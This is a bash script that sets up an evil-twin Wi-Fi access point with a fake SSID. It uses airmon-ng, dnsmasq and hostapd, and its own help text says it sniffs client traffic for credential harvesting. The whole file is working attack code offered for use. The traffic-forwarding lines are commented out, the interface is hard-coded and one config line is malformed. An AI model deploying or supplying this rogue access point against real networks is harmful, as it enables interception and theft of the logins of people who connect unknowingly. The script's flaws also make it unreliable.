#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_----------------------------------------------+"
echo -e "|  Adversarial Informatics Combat MITM WIFI AP     |"
echo -e "|               cygienesolutions.com               |"
echo -e "|    [Usage]: ./mitm_wifi_ap.sh <INF> <TARGET>     |"
echo -e "+-------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Successful execution will stand up an AP with a spefified SSID"
    echo -e "forward client traffic to the internet and sniff traffic for cred"
    echo -e "harvesting."
    echo -e ""
    echo -e "[Usage]: ./mitm_wifi_ap.sh wlan1 <SSID>"
    echo -e "${NC}"
    exit 1; fi

INTERFACE="$1"
TARGET="$2"
#GATEWAY=$(ip route | grep default | awk '{print $3}'

echo -e "${GREEN}"
echo -e "Putting interface into monitor mode..."
echo -e "${NC}"
airmon-ng start wlan1

echo -e "${GREEN}"
echo -e "Configuring IP address of wlan1mon..."
echo -e "${NC}"
ip link set wlan1mon down
ifconfig wlan1mon up 192.168.2.1 netmask 255.255.255.0
route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
ip link set wlan1mon up

echo -e "${GREEN}"
echo -e "Writing DNS Masquerade configuration file..."
echo -e "${NC}"
echo "interface=wlan1mon" > dnsmasq.conf
echo "dhcp-range=192.168.2.2, 192.168.2.254, 255.255.255.0, 12h" >> dnsmasq.conf
echo "dhcp-option=3, 192.168.2.1" >> dnsmasq.conf
echo "dhcp-option=6, 192.168.2.1" >> dnsmasq.conf
echo "server=8.8.8.8" >> dnsmasq.conf
echo "log-queries" >> dnsmasq.conf
echo "log-dhcp" >> dnsmasq.conf
echo "listen-address=127.0.0.1" >> dnsmasq.conf


echo -e "${GREEN}"
echo -e "Writing Fake AP configuration file..."
echo -e "${NC}"
echo "interface=wlan1mon" > hostapd.conf
echo "driver=nl80211" >> hostapd.conf
echo "ssid=Linksys39294" >> hostapd.conf
echo "hw_mode=g" >> hostapd.conf
echo "channel=11" >> hostapd.conf
echo "macaddr_acl=0" >> hostapd.conf
ignore_broadcast_ssid=0

echo -e "${GREEN}"
echo -e "Creating portforwarding rules..."
echo -e "${NC}"
#iptables --table nat --append POSTROUTING --out-interface wlan0  -j MASQUERADE
#iptables --append FORWARD --in-interface wlan1mon -j ACCEPT
#echo 1 > /proc/sys/net/ipv4/ip_forward
#sysctl net.ipv4.ip_forward

echo -e "${GREEN}"
echo -e "Enable DNS Maquerade and Fake AP"
echo -e "${NC}"
dnsmasq -C ./dnsmasq.conf -d & hostapd hostapd.conf

 
